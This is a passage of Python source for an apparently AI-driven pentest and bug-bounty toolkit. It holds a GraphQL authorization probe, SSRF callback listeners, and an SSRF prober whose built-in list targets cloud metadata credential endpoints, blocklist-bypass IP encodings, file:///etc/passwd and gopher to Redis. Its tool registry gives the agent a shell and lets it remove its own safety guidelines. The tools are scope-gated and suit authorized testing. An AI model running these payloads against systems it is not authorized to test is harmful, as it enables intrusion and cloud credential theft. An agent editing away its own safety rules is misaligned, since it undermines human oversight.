        ds = os.path.expanduser(os.environ.get("SYGNIF_PY_VELO_DIR", "/var/lib/sygnif/velociraptor"))
        out, rc, where = _def_run(_velo_live_cmd(sub, ds), 120)
        if "VELO_MISSING" in out:
            return ("triage: Velociraptor not installed — velociraptor.app/downloads or `sygnif kali-setup`.")
        return _def_report("triage(live:" + sub + ")", "velociraptor gui " + sub, out or "(no output)", rc, where)
    if mode == "artifacts":
        cmd = VELO + '"$V" --nobanner artifacts list 2>/dev/null | head -200'
    elif mode == "collect":
        art = str(args.get("artifact", "Generic.Client.Info")).strip()
        cmd = VELO + '"$V" --nobanner artifacts collect ' + shlex.quote(art) + " 2>&1 | tail -160"
    elif mode == "hunt":
        vql = str(args.get("query", "")).strip()
        if not vql:
            return ("triage hunt: give a 'query' (VQL), e.g. "
                    "\"SELECT Name,Pid,Exe FROM pslist()\" — or use mode=collect artifact=<name>.")
        cmd = VELO + '"$V" --nobanner query ' + shlex.quote(vql) + " 2>&1 | tail -160"
    else:
        return "triage mode = collect | hunt | artifacts. Live IR with Velociraptor."
    out, rc, where = _def_run(cmd, 900)
    if "VELO_MISSING" in out:
        return ("triage: Velociraptor not installed — grab the single binary from "
                "velociraptor.app/downloads and put it on PATH as 'velociraptor'.")
    return _def_report("triage(" + mode + ")", cmd, out or "(no output)", rc, where)


def _http_post_json(url: str, payload: dict, headers: dict, timeout: int = 30):
    import urllib.request, urllib.error
    data = json.dumps(payload).encode()
    req = urllib.request.Request(url, data=data, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.getcode(), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return 0, f"[error: {e}]"


def tool_graphql(args: dict) -> str:
    """GraphQL authorization probe. op=introspect (default) returns a COMPACT
    schema summary (type/mutation counts + sensitive-looking field names, never the
    full dump, so a big schema cannot blow the turn budget); op=query runs a given
    'query' with an optional bearer 'token'. Built for field/resolver-level authz
    testing: introspect once, then re-query sensitive fields with a low-priv token
    and compare. Requires target (the /graphql endpoint URL) + authorization."""
    target = str(args.get("target") or args.get("endpoint") or args.get("url") or "").strip()
    gate = _authz(args, target)
    if gate:
        return gate
    token = str(args.get("token") or "").strip()
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = "Bearer " + token
    auth = args.get("authorization", "")
    op = str(args.get("op") or ("query" if args.get("query") else "introspect")).strip().lower()
    if op == "query":
        q = str(args.get("query") or "").strip()
        if not q:
            return "REFUSED: op=query needs a 'query'."
        code, body = _http_post_json(target, {"query": q, "variables": args.get("variables") or {}}, headers)
        out = body if len(body) <= 4000 else body[:4000] + f"\n… (+{len(body)-4000} bytes truncated)"
        return _off_report("graphql(query)", auth, f"POST {target} query={q[:120]}",
                           f"HTTP {code}\n{out}", 0 if code else 1, "host:urllib", target)
    q = ("query{__schema{queryType{name} mutationType{name} "
         "types{name kind fields{name}}}}")
    code, body = _http_post_json(target, {"query": q}, headers)
    if not code:
        return _off_report("graphql(introspect)", auth, f"POST {target}", body, 1, "host:urllib", target)
    try:
        sch = (json.loads(body).get("data") or {}).get("__schema") or {}
        types = sch.get("types") or []
        mn = (sch.get("mutationType") or {}).get("name")
        muts, sens = [], []
        for t in types:
            fields = t.get("fields") or []
            if t.get("name") == mn:
                muts = [f.get("name") for f in fields]
            for f in fields:
                fn = (f.get("name") or "").lower()
                if any(k in fn for k in ("token", "secret", "password", "privatekey", "email",
                                          "private", "admin", "sshkey", "runner", "variable",
                                          "credential", "accesstoken")):
                    sens.append(f"{t.get('name')}.{f.get('name')}")
        out = "\n".join([
            f"introspection: {'ENABLED' if types else 'disabled/empty'} (token={'yes' if token else 'no'})",
            f"queryType={(sch.get('queryType') or {}).get('name')} mutationType={mn} types={len(types)}",
            f"mutations ({len(muts)}): " + ", ".join(muts[:80]),
            f"sensitive-looking fields ({len(sens)}): " + ", ".join(sens[:80]),
        ])
    except Exception as e:  # noqa: BLE001
        out = f"[parse error: {e}] first 1200 bytes:\n{body[:1200]}"
    return _off_report("graphql(introspect)", auth, f"POST {target} introspection",
                       f"HTTP {code}\n{out}", 0, "host:urllib", target)


_SSRF_DNS_SERVER = r'''
import socket, datetime, sys
LOG, PORT, ANSWER = sys.argv[1], int(sys.argv[2]), sys.argv[3]
def qname(d):
    # parse the question name starting at offset 12
    i, parts = 12, []
    while i < len(d):
        n = d[i]
        if n == 0:
            break
        parts.append(d[i+1:i+1+n].decode("latin-1", "replace")); i += n + 1
    return ".".join(parts), i + 1
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", PORT))
while True:
    try:
        data, addr = s.recvfrom(2048)
        name, qend = qname(data)
        open(LOG, "a").write(f"{datetime.datetime.now().isoformat()} DNS {name} from {addr[0]}\n")
        # minimal A-record response: echo question + one answer pointing at ANSWER
        tid = data[:2]
        header = tid + b"\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00"
        question = data[12:qend+4]
        octets = bytes(int(x) for x in ANSWER.split("."))
        answer = b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04" + octets
        s.sendto(header + question + answer, addr)
    except Exception:
        continue
'''


def tool_ssrf_catcher(args: dict) -> str:
    """Out-of-band SSRF catcher — your own listeners for confirming blind SSRF.

    HTTP (action=start): stands up an HTTP listener that logs every inbound request
    (method/path/src/UA) and returns callback URLs to feed into SSRF sinks.
    Containers reach the host at 172.17.0.1; the socket binds 0.0.0.0 by default so
    both the docker bridge AND host loopback hit it (override with bind=127.0.0.1
    for loopback-only). Because 0.0.0.0 also exposes the port on the tailnet/LAN,
    the return value names the bind so you can firewall it if needed.
      - redirect=<url>: instead of 200/ok, answer 302 Location:<url>. Feed the
        catcher URL to a sink that validates the FIRST host then follows redirects,
        pointing redirect= at 169.254.169.254 or another internal target — the
        classic allow-list bypass the plain catcher can't do.
    DNS (action=start_dns): stands up a tiny UDP DNS server that logs every queried
    name and answers A. Confirms blind SSRF where HTTP egress is filtered but DNS
    resolution is not. Point a hostname delegated to this box (NS -> here) at a
    sink; any lookup lands in the log. Ports <1024 need root, so it defaults to 5354.

    action=check / check_dns greps the hit log (optional 'nonce' filter);
    action=stop / stop_dns kills the listener. Your own listeners, so not
    target-gated — the SSRF injection itself uses the gated web/graphql/shell tools."""
    import os
    action = str(args.get("action") or "check").strip().lower()
    port = int(args.get("port") or (5354 if "dns" in action else 9899))
    bind = str(args.get("bind") or "0.0.0.0").strip()
    redirect = str(args.get("redirect") or "").strip()
    sdir = os.path.expanduser("~/sygnif-pentest/ssrf")
    os.makedirs(sdir, exist_ok=True)
    logf = os.path.join(sdir, "hits.log")
    dlogf = os.path.join(sdir, "dns.log")
    pidf = os.path.join(sdir, "catcher.pid")
    dpidf = os.path.join(sdir, "dns.pid")
    srv = os.path.join(sdir, "catcher.py")
    dsrv = os.path.join(sdir, "dns_catcher.py")

    if action == "start":
        # redirect mode → 302 to the given URL; else 200/ok. json.dumps embeds the
        # bind/redirect safely as Python string literals in the generated server.
        resp = (f"s.send_response(302); s.send_header('Location', {json.dumps(redirect)}); s.end_headers()"
                if redirect else
                "s.send_response(200); s.end_headers(); s.wfile.write(b'ok')")
        with open(srv, "w") as fh:
            fh.write(
                "import http.server,datetime,sys\n"
                "L=sys.argv[1]; BIND=sys.argv[3] if len(sys.argv)>3 else '0.0.0.0'\n"
                "class H(http.server.BaseHTTPRequestHandler):\n"
                "  def _log(s):\n"
                "    open(L,'a').write(f'{datetime.datetime.now().isoformat()} {s.command} {s.path} from {s.client_address[0]} UA={s.headers.get(\"User-Agent\",\"\")}\\n')\n"
                f"  def do_GET(s): s._log(); {resp}\n"
                f"  def do_POST(s): s._log(); {resp}\n"
                "  def log_message(s,*a): pass\n"
                "http.server.HTTPServer((BIND,int(sys.argv[2])),H).serve_forever()\n")
        out, rc = _run_host(f"nohup python3 {shlex.quote(srv)} {shlex.quote(logf)} {port} {shlex.quote(bind)} "
                            f">/dev/null 2>&1 & echo $!", 10)
        pid = out.strip().splitlines()[-1] if out.strip() else "?"
        open(pidf, "w").write(pid)
        nonce = "sg" + os.urandom(4).hex()
        expose = ("" if bind in ("127.0.0.1", "::1", "localhost")
                  else f"\n⚠ bound {bind}:{port} — reachable on the tailnet/LAN too; firewall the port if that matters.")
        mode = f"redirect->{redirect}" if redirect else "log-only (200 ok)"
        return (f"[ssrf-catcher started pid={pid} bind={bind} port={port} mode={mode}]\n"
                f"callback (from a container target): http://172.17.0.1:{port}/{nonce}\n"
                f"callback (host loopback): http://127.0.0.1:{port}/{nonce}\n"
                + (f"redirect: every hit → 302 {redirect} (feed this to an allow-list-then-follow sink)\n" if redirect else "")
                + f"nonce={nonce} — put it in the path so you can tell hits apart. "
                f"Then: ssrf_catcher(action=check, nonce={nonce}).{expose}")

    if action == "start_dns":
        answer = str(args.get("answer") or "127.0.0.1").strip()
        with open(dsrv, "w") as fh:
            fh.write(_SSRF_DNS_SERVER)
        out, rc = _run_host(f"nohup python3 {shlex.quote(dsrv)} {shlex.quote(dlogf)} {port} {shlex.quote(answer)} "
                            f">/dev/null 2>&1 & echo $!", 10)
        pid = out.strip().splitlines()[-1] if out.strip() else "?"
        open(dpidf, "w").write(pid)
        note = "" if port >= 1024 else "\n⚠ port <1024 needs root; if it didn't bind, rerun with a port ≥1024."
        return (f"[ssrf-dns-catcher started pid={pid} udp port={port} answer={answer}]\n"
                f"Point a hostname delegated to this host (NS record → this box:{port}) at the sink;\n"
                f"every DNS lookup of it is logged even when HTTP egress is filtered.\n"
                f"Check with: ssrf_catcher(action=check_dns).{note}")

    if action in ("stop", "stop_dns"):
        pf = dpidf if action == "stop_dns" else pidf
        try:
            pid = open(pf).read().strip()
            _run_host(f"kill {int(pid)} 2>/dev/null", 5)
            return f"[{'ssrf-dns-catcher' if action=='stop_dns' else 'ssrf-catcher'} stopped pid={pid}]"
        except Exception as e:  # noqa: BLE001
            return f"[stop: {e}]"

    # check / check_dns
    target_log = dlogf if action == "check_dns" else logf
    label = "ssrf-dns-catcher" if action == "check_dns" else "ssrf-catcher"
    nonce = str(args.get("nonce") or "").strip()
    try:
        lines = open(target_log).read().splitlines()
    except OSError:
        return f"[no {label} hits yet — not started or nothing called back]"
    if nonce:
        lines = [x for x in lines if nonce in x]
    tail = lines[-40:]
    return (f"[{label} hits: {len(lines)}" + (f" matching {nonce}" if nonce else "") + "]\n"
            + ("\n".join(tail) if tail else "(none)"))



def _http_send(method: str, url: str, headers: dict | None = None,
               body: bytes | None = None, timeout: int | None = None,
               allow_redirects: bool = True) -> tuple[int, dict, str, str]:
    """Send one HTTP request. Returns (status, resp_headers, body, error).
    Never raises. Used by the SSRF prober so it can report the sink's response
    headers (Location/Content-Type) that often carry the SSRF tell."""
    import urllib.request, urllib.error
    h = {"User-Agent": _UA, "Accept": "*/*"}
    if headers:
        h.update(headers)
    to = timeout or WEB_TIMEOUT

    class _NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k):  # noqa: D401
            return None

    op = urllib.request.build_opener() if allow_redirects else urllib.request.build_opener(_NoRedirect)
    req = urllib.request.Request(url, data=body, headers=h, method=method.upper())
    try:
        with op.open(req, timeout=to) as resp:
            raw = resp.read(WEB_MAXBYTES + 1)
            txt = raw[:WEB_MAXBYTES].decode(errors="replace")
            if len(raw) > WEB_MAXBYTES:
                txt += f"\n[... truncated at {WEB_MAXBYTES} bytes ...]"
            return getattr(resp, "status", 200), dict(resp.headers), txt, ""
    except urllib.error.HTTPError as e:
        try:
            eh = dict(e.headers)
        except Exception:  # noqa: BLE001
            eh = {}
        return e.code, eh, e.read().decode(errors="replace")[:WEB_MAXBYTES], f"HTTP {e.code}"
    except Exception as e:  # noqa: BLE001
        return 0, {}, "", f"{type(e).__name__}: {e}"


# Built-in inner targets for an SSRF reachability sweep: the standard set that
# confirms the sink reaches internal/link-local space you can't reach directly.
_SSRF_INTERNAL = [
    # --- cloud instance metadata (the crown jewels of an SSRF) ---
    ("aws-imds",        "http://169.254.169.254/latest/meta-data/"),
    ("aws-imds-creds",  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("aws-imdsv2-token","http://169.254.169.254/latest/api/token"),   # PUT-only; GET here 405 => IMDSv2 present
    ("gcp-metadata",    "http://metadata.google.internal/computeMetadata/v1/instance/"),
    ("gcp-token",       "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
    ("azure-imds",      "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
    ("azure-token",     "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"),
    ("digitalocean",    "http://169.254.169.254/metadata/v1.json"),
    ("oracle-oci",      "http://169.254.169.254/opc/v2/instance/"),
    ("alibaba",         "http://100.100.100.200/latest/meta-data/"),
    # --- loopback + name/scheme variants ---
    ("loopback",        "http://127.0.0.1/"),
    ("loopback-name",   "http://localhost/"),
    ("loopback-ipv6",   "http://[::1]/"),
    ("loopback-any",    "http://0.0.0.0/"),
    ("docker-host",     "http://172.17.0.1/"),
    # --- IP-encoding bypasses of a 127.0.0.1 string blocklist ---
    ("enc-decimal",     "http://2130706433/"),                # 127.0.0.1 as a 32-bit int
    ("enc-hex",         "http://0x7f000001/"),                # 127.0.0.1 in hex
    ("enc-octal",       "http://0177.0.0.1/"),                # 127.0.0.1 with an octal octet
    ("enc-short",       "http://127.1/"),                     # short form -> 127.0.0.1
    ("enc-ipv4mapped",  "http://[::ffff:127.0.0.1]/"),        # IPv4-mapped IPv6
    ("enc-imds-decimal","http://2852039166/latest/meta-data/"),  # 169.254.169.254 as a decimal int
    # --- alternate schemes (sink must support them; carrier-dependent) ---
    ("scheme-file",     "file:///etc/passwd"),                # local file read
    ("scheme-gopher",   "gopher://127.0.0.1:6379/_INFO%0d%0a"),  # unauth internal Redis
    ("scheme-dict",     "dict://127.0.0.1:11211/stats"),      # internal memcached banner
]


def _ssrf_inner_headers(inner: str) -> dict:
    """Provider quirks the sink must forward for the fetch to succeed. These only
    help when the SSRF carrier lets you set request headers the sink forwards;
    many sinks strip them, but sending them costs nothing and turns a would-be
    403/401 into real metadata when they do pass through."""
    h = {}
    low = inner.lower()
    if "metadata.google.internal" in low or "computemetadata/v1" in low:
        h["Metadata-Flavor"] = "Google"                 # GCP
    if "/metadata/instance" in low or "/metadata/identity" in low:
        h["Metadata"] = "true"                          # Azure IMDS
    if "/opc/v2/" in low:
        h["Authorization"] = "Bearer Oracle"            # Oracle OCI IMDSv2
    return h


def _ssrf_inject(target: str, inner: str, method: str, param: str,
                 field: str, body_tmpl: str) -> tuple[str, bytes | None, dict]:
    """Place `inner` into the request per the chosen carrier. Returns
    (url, body_bytes, extra_headers). Carriers, in priority order:
      - body template with {{SSRF}} placeholder (raw body, any content-type)
      - POST + field: JSON body {field: inner} (or merged into a JSON template)
      - GET/POST + param: set/replace that query parameter with inner
      - else: append ?url=<inner> as a sane default."""
    import urllib.parse as up
    extra: dict = {}
    # 1. explicit body template
    if body_tmpl:
        b = body_tmpl.replace("{{SSRF}}", inner)
        if body_tmpl.lstrip().startswith(("{", "[")):
            extra["Content-Type"] = "application/json"
        else:
            extra.setdefault("Content-Type", "application/x-www-form-urlencoded")
        return target, b.encode(), extra
    # 2. POST + JSON field
    if method.upper() == "POST" and field:
        extra["Content-Type"] = "application/json"
        return target, json.dumps({field: inner}).encode(), extra
    # 3. query parameter
    if param:
        parts = up.urlsplit(target)
        q = dict(up.parse_qsl(parts.query, keep_blank_values=True))
        q[param] = inner
        new = parts._replace(query=up.urlencode(q))
        return up.urlunsplit(new), (b"" if method.upper() == "POST" else None), extra
    # 4. default: ?url=
    sep = "&" if up.urlsplit(target).query else "?"
    return target + sep + "url=" + up.quote(inner, safe=""), None, extra


def tool_ssrf(args: dict) -> str:
    """SSRF prober for an AUTHORIZED sink. You point it at a request that the
    target server makes on your behalf (an in-scope URL: fetcher, webhook, image
    proxy, import-by-URL, PDF/render, CI include) and it injects an inner URL you
    control, then reports the sink's response so you can confirm the fetch.

    Two ways to confirm:
      - blind: set the inner URL to your ssrf_catcher callback + a nonce, send,
        then ssrf_catcher(action=check, nonce=...) to see the inbound hit.
      - direct: read the sink's response body/headers for the fetched content.

    Carriers (how the inner URL is placed): body='...{{SSRF}}...' (raw body,
    any content-type), or method=POST + field=<json key>, or param=<query param>,
    or the default ?url=. Auth to the sink via token/cookie/auth_header/headers.

    mode=probe (default) sends one inner URL you give. mode=sweep walks a built-in
    internal/link-local target list (AWS IMDSv1 + IMDSv2 detection, GCP/Azure/
    DigitalOcean/Oracle/Alibaba metadata, loopback, docker-host, IP-encoding
    bypasses, and file://gopher://dict:// schemes) against the same sink and diffs
    each response against an external control, flagging which targets it reached.
    Scope-gated on the sink (target) via SCOPE.md + authorization, like every
    offensive tool. The inner URL is not scope-checked — that is the whole point of
    SSRF — so keep the sink itself in scope and the inner URLs to lab/own infra."""
    target = str(args.get("target") or args.get("url") or args.get("sink") or "").strip()
    gate = _authz(args, target)
    if gate:
        return gate
    auth = args.get("authorization", "")
    method = str(args.get("method") or ("POST" if (args.get("field") or args.get("body")) else "GET")).strip().upper()
    param = str(args.get("param") or "").strip()
    field = str(args.get("field") or "").strip()
    body_tmpl = str(args.get("body") or "").strip()
    mode = str(args.get("mode") or "probe").strip().lower()
    nonce = str(args.get("nonce") or "").strip()
    no_redir = str(args.get("follow_redirects", "1")).lower() in ("0", "false", "no")

    base_headers = {}
    for k, v in _web_auth_headers(args):
        base_headers[k] = v

    def _one(inner: str, label: str = "") -> tuple[str, int, str]:
        eff = inner
        if nonce:
            if "?" in inner:
                eff = inner + "&n=" + nonce
            else:
                eff = inner.rstrip("/") + "/" + nonce
        url, body, extra = _ssrf_inject(target, eff, method, param, field, body_tmpl)
        hdrs = dict(base_headers)
        hdrs.update(extra)
        hdrs.update(_ssrf_inner_headers(eff))
        st, rhdrs, rbody, err = _http_send(method, url, hdrs, body,
                                           timeout=min(OFFENSIVE_TIMEOUT, 30),
                                           allow_redirects=not no_redir)
        loc = rhdrs.get("Location") or rhdrs.get("location") or ""
        ctype = rhdrs.get("Content-Type") or rhdrs.get("content-type") or ""
        snip = (rbody or "").strip().replace("\n", " ")[:400]
        tag = f"[{label}] " if label else ""
        line = (f"{tag}{method} inner={eff}\n"
                f"    sink-status={st or 'connect-fail'} ctype={ctype[:60]}"
                + (f" location={loc[:120]}" if loc else "")
                + (f" err={err}" if err and not st else "") + "\n"
                f"    body[:400]={snip or '(empty)'}")
        return line, st, snip

    if mode == "sweep":
        # control: an inner URL that only resolves off-box, to baseline the sink.
        ctrl_line, ctrl_st, ctrl_snip = _one("http://sygnif-ssrf-control.invalid/", "control")
        rows = [ctrl_line]
        reached = []
        notes = []
        seen = {}
        for label, inner in _SSRF_INTERNAL:
            line, st, snip = _one(inner, label)
            rows.append(line)
            seen[label] = (st, snip)
            # a differing status or non-empty body vs the control = likely reached
            if st and (st != ctrl_st or (snip and snip != ctrl_snip)):
                reached.append(f"{label} ({inner}) -> status {st}")
        # AWS IMDSv2 vs v1: a 401/403 on the v1 data path while the token endpoint
        # answers means IMDSv2 is enforced — a GET-only SSRF cannot mint the token
        # (that needs a PUT to /latest/api/token), so v1 creds are NOT reachable
        # blind. Say so instead of reporting a bare 401 as "blocked".
        v1_st = seen.get("aws-imds", (0, ""))[0]
        tok_st = seen.get("aws-imdsv2-token", (0, ""))[0]
        if v1_st in (401, 403) and tok_st and tok_st != ctrl_st:
            notes.append("AWS IMDSv2 appears ENFORCED (v1 data path "
                         f"{v1_st}, token endpoint reachable): a GET-only SSRF can't mint the "
                         "PUT token, so instance creds are out of reach unless the sink can issue "
                         "a PUT (some proxies can) — try a carrier that controls the method.")
        elif seen.get("aws-imds-creds", (0, ""))[1]:
            notes.append("AWS IMDSv1 creds path returned a body — likely IMDSv1 open; pull "
                         "iam/security-credentials/<role> for keys.")
        if any(l.startswith("scheme-") for l, _ in _SSRF_INTERNAL):
            notes.append("scheme-* rows depend on the sink's URL library; a connect-fail there "
                         "usually means the scheme is unsupported, not that the service is down.")
        verdict = ("REACHED (differs from control): " + "; ".join(reached)) if reached else \
                  "no internal target clearly differed from control (sink may block, or is not an SSRF sink)"
        out = "SSRF reachability sweep vs external control\n\n" + "\n".join(rows) + \
              f"\n\nverdict: {verdict}\n" + \
              ("".join(f"note: {n}\n" for n in notes)) + \
              "confirm blind hits separately with ssrf_catcher(action=check)."
        return _off_report("ssrf(sweep)", auth, f"{method} {target} <- internal sweep", out,
                           0, "host:urllib", target)

    inner = str(args.get("inner") or args.get("fetch") or args.get("fetch_url") or "").strip()
    if not inner:
        return ("REFUSED: mode=probe needs an 'inner' URL for the sink to fetch "
                "(e.g. your ssrf_catcher callback, or an internal/metadata URL). "
                "Or use mode=sweep for the built-in internal target list.")
    line, st, _ = _one(inner)
    out = (line + "\n\n"
           "next: if this was your ssrf_catcher callback, run "
           f"ssrf_catcher(action=check{', nonce=' + nonce if nonce else ''}) to confirm the "
           "inbound hit (blind SSRF); otherwise the body/headers above are the direct read.")
    return _off_report("ssrf(probe)", auth, f"{method} {target} inner={inner[:120]}", out,
                       0 if st else 1, "host:urllib", target)



# --- bug-bounty discovery ---------------------------------------------------
# Reward money + target scope are the two things that decide whether a program
# is worth our time, so this pulls the public, keyless, ~daily-updated program
# directories (arkadiyt/bounty-targets-data: Bugcrowd, HackerOne, Intigriti,
# YesWeHack) and normalises every program to {reward, scope}. It finds programs;
# it does NOT test them — the operator still records authorized targets in
# SCOPE.md before any tool touches them. (Immunefi/crypto has no keyless feed;
# FireBounty is HTML-only — both are future scraper add-ons.)
_BOUNTY_SRC = "https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data"
_BOUNTY_CACHE = os.path.join(os.path.expanduser("~"), ".sygnif", "bounty_cache")
_BOUNTY_TTL = 6 * 3600
_BOUNTY_FILES = ("bugcrowd_data", "hackerone_data", "intigriti_data", "yeswehack_data")


def _bounty_fetch(name: str) -> list:
    """One platform file, cached ~6h; falls back to a stale cache on network error."""
    try:
        os.makedirs(_BOUNTY_CACHE, exist_ok=True)
    except Exception:  # noqa: BLE001
        pass
    fp = os.path.join(_BOUNTY_CACHE, name + ".json")
    if os.path.exists(fp) and (time.time() - os.path.getmtime(fp)) < _BOUNTY_TTL:
        try:
            with open(fp, encoding="utf-8") as fh:
                return json.load(fh)
        except Exception:  # noqa: BLE001
            pass
    try:
        req = urllib.request.Request(_BOUNTY_SRC + "/" + name + ".json",
                                     headers={"User-Agent": "sygnif-bounty"})
        with urllib.request.urlopen(req, timeout=60) as r:
            data = json.loads(r.read().decode("utf-8", "replace"))
        try:
            with open(fp, "w", encoding="utf-8") as fh:
                json.dump(data, fh)
        except Exception:  # noqa: BLE001
            pass
        return data
    except Exception:  # noqa: BLE001 — network down; use stale cache if any
        if os.path.exists(fp):
            try:
                with open(fp, encoding="utf-8") as fh:
                    return json.load(fh)
            except Exception:  # noqa: BLE001
                pass
        return []


def _bounty_scope(t: dict) -> str:
    for k in ("target", "uri", "asset_identifier", "endpoint", "host", "name"):
        v = t.get(k)
        if v:
            return str(v)
    return ""


def _bounty_num(v) -> int:
    """Extract a whole-number reward from int/float, {'value'|'amount': n}, or a $ string."""
    if isinstance(v, bool):
        return 0
    if isinstance(v, (int, float)):
        return int(v)
    if isinstance(v, dict):
        for k in ("value", "amount", "max", "usd"):
            if isinstance(v.get(k), (int, float)):
                return int(v[k])
    if isinstance(v, str):
        m = re.search(r"\d[\d,]*", v)
        if m:
            return int(m.group().replace(",", ""))
    return 0


def _bounty_programs() -> list:
    """All platforms normalised to a common shape (reward + scope)."""
    progs = []
    for f in _BOUNTY_FILES:
        plat = f.split("_", 1)[0]
        for p in _bounty_fetch(f):
            if not isinstance(p, dict):
                continue
            ins = [_bounty_scope(t) for t in ((p.get("targets") or {}).get("in_scope") or [])
                   if isinstance(t, dict)]
            ins = [x for x in ins if x]
            cur = "$"
            if plat == "bugcrowd":
                mx, mn = _bounty_num(p.get("max_payout")), 0
                bounties = bool(mx)
            elif plat in ("intigriti", "yeswehack"):
                mb = p.get("max_bounty")
                if isinstance(mb, dict) and mb.get("currency") == "EUR":
                    cur = "\u20ac"
                mx, mn = _bounty_num(mb), _bounty_num(p.get("min_bounty"))
                bounties = bool(mx)
            else:  # hackerone — bounties flag only, no $ amount in the feed
                mx, mn = 0, 0
                bounties = bool(p.get("offers_bounties"))
            progs.append({
                "platform": plat, "name": (p.get("name") or p.get("handle") or "").strip(),
                "url": p.get("url") or "", "max": mx, "min": mn, "cur": cur,
                "bounties": bounties, "safe_harbor": p.get("safe_harbor"),
                "ttb": p.get("average_time_to_bounty_awarded"), "in_scope": ins,
            })
    return progs


def _money(p: dict) -> str:
    if p["max"]:
        return "%s%s" % (p.get("cur", "$"), format(p["max"], ","))
    return "bounty" if p["bounties"] else "VDP/no$"


def tool_bounty(args: dict) -> str:
    q = str(args.get("target") or args.get("query") or "").strip().lower()
    plat = str(args.get("platform") or "").strip().lower()
    program = str(args.get("program") or "").strip().lower()
    try:
        min_reward = int(args.get("min_reward") or 0)
    except Exception:  # noqa: BLE001
        min_reward = 0
    try:
        limit = max(1, min(int(args.get("limit") or 20), 100))
    except Exception:  # noqa: BLE001
        limit = 20
    progs = _bounty_programs()
    if not progs:
        return ("bounty: could not fetch program directories (network?). Source: "
                "arkadiyt/bounty-targets-data (bugcrowd/hackerone/intigriti/yeswehack).")
    if program:
        hit = [p for p in progs if program in p["name"].lower() or program in p["url"].lower()]
        if not hit:
            return "bounty: no program matching '" + program + "'. Try `bounty target=" + program + "`."
        hit.sort(key=lambda p: -(p["max"] or 0))
        p = hit[0]
        head = ("%s [%s]  max=%s  safe_harbor=%s\n%s\nIN SCOPE (%d assets):"
                % (p["name"], p["platform"], _money(p), p.get("safe_harbor"), p["url"], len(p["in_scope"])))
        body = "\n".join("  " + t for t in p["in_scope"][:250]) or "  (no assets listed in feed — read the program page)"
        return head + "\n" + body + ("\n\nPaste ONLY the assets you're authorized to test into ~/sygnif-pentest/SCOPE.md "
                                     "before running any tool against them.")

    def keep(p):
        if plat and p["platform"] != plat:
            return False
        if min_reward and (p["max"] or 0) < min_reward:
            return False
        if q:
            if q in p["name"].lower():
                return True
            return any(q in t.lower() for t in p["in_scope"])
        return True

    sel = [p for p in progs if keep(p)]
    sel.sort(key=lambda p: (-(p["max"] or 0), -int(p["bounties"]), -len(p["in_scope"])))
    hdr = ("Bug-bounty programs by MAX REWARD"
           + (" matching '" + q + "'" if q else "")
           + (" >= $" + format(min_reward, ",") if min_reward else "")
           + (" on " + plat if plat else "")
           + "  —  %d match, top %d:" % (len(sel), min(limit, len(sel))))
    lines = [hdr]
    for p in sel[:limit]:
        sh = " [safe-harbor]" if p.get("safe_harbor") == "full" else ""
        mt = ""
        if q:
            hits = [t for t in p["in_scope"] if q in t.lower()][:3]
            if hits:
                mt = "  ->" + ", ".join(hits)
        lines.append("%12s  %-10s %-46s scope:%-4d%s%s"
                     % (_money(p), p["platform"], p["name"][:46], len(p["in_scope"]), sh, mt))
        lines.append(" " * 14 + p["url"])
    lines.append("\nNext: `bounty program=<name>` for full scope -> record authorized targets in SCOPE.md. "
                 "(HackerOne feed has no $ amount, only a bounties flag; Immunefi/crypto not covered.)")
    return "\n".join(lines)


BUILTIN_TOOLS: dict[str, dict] = {
    "bounty": {
        "desc": ("Find VALUABLE bug-bounty programs from the public multi-platform "
                 "directory (Bugcrowd, HackerOne, Intigriti, YesWeHack; keyless, ~daily). "
                 "Ranked by MAX REWARD $ then scope size — reward and target are the "
                 "priorities. No args = top-paying programs. target=<keyword> matches a "
                 "program name OR an in-scope asset (domain/tech/app). program=<name> dumps "
                 "one program's full in-scope list to record in SCOPE.md. Finds programs "
                 "only; never tests them."),
        "args": {
            "target": "optional keyword to match program name OR an in-scope asset (e.g. 'coinbase', 'tesla', 'api', 'android')",
            "min_reward": "optional: only programs whose max payout is at least this many $",
            "platform": "optional: bugcrowd | hackerone | intigriti | yeswehack",
            "program": "optional: dump ONE program's full in-scope list by name",
            "limit": "optional: how many programs to list (default 20, max 100)",
        },
        "func": tool_bounty,
    },
    "shell": {
        "desc": (
            "Run a command on THIS machine (as the seat user) and return its "
            "stdout, stderr and exit code. Use it to inspect the system, run "
            "builds/tests, or drive any CLI tool that is installed."
        ),
        "args": {"command": "the shell command to run, e.g. 'ls -la ~'"},
        "func": tool_shell,
    },
    "read_file": {
        "desc": "Read a UTF-8 text file. Optional 0-based 'start'/'end' line range.",
        "args": {
            "path": "file path (supports ~)",
            "start": "optional first line (0-based)",
            "end": "optional end line (exclusive)",
        },
        "func": tool_read_file,
    },
    "write_file": {
        "desc": "Write (overwrite) a UTF-8 text file, creating parent dirs as needed.",
        "args": {"path": "file path (supports ~)", "content": "full file contents"},
        "func": tool_write_file,
    },
    "note": {
        "desc": "Append a timestamped line to the working journal — record decisions, findings, and where evidence lives.",
        "args": {"text": "the note to record"},
        "func": tool_note,
    },
    "identity": {
        "desc": (
            "View or CHANGE identity + standing instructions — SYGNIF py's OWN, or a "
            "PROVIDER's (provider=<model key>, e.g. fable/claude). Provider role/conduct "
            "overrides the seat's own when that provider is active; provider instructions "
            "append after the global ones. Safety guidelines are cumulative (global always "
            "applies, a provider only adds). Persists to the identity file; effective NEXT "
            "session. mode=show | set_role | set_conduct | add_instruction | "
            "remove_instruction | add_safety | remove_safety | reset."
        ),
        "args": {
            "mode": "show | set_role | set_conduct | add_instruction | remove_instruction | add_safety | remove_safety | reset",
